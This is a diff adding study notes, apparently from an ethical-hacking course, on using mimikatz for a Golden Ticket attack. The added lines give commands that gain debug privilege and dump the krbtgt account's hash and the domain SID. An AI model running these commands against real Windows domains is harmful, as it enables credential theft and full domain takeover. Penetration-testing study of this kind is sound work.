@@ -23,5 +23,27 @@ Privilege '20' OK
 as the response
 see here: https://adsecurity.org/?page_id=1821, where it explains: "PRIVILEGE::Debug – get debug rights (this or Local System rights is required for many Mimikatz commands)"
 
+-------------------------------------------------------
+Using mimikatz for a Golden Ticket Attack
+
+from: Heath Adams - The Cyber Mentor ; Practical Ethical Hacking - The Complete Course
+"Golden Ticket Attacks Overview" - https://academy.tcm-sec.com/courses/1152300/lectures/48497537
+"Golden Ticket Attacks" - https://academy.tcm-sec.com/courses/1152300/lectures/24781487
+
+- used when you have the hash of the krbtgt account
+- golden tickets give complete access to all machines in the domain; including allowing shells on them
+
+syntax:
+
+$ mimikatz.exe
+
+mimikatz # privilege::debug
+
+mimikatz # lsadump::lsa /inject /name:krbtgt 
+
+[from the output, copy the SID of the domain and the NTLM hash of the krbtgt account for use in the following command]
+
+
+
 
 
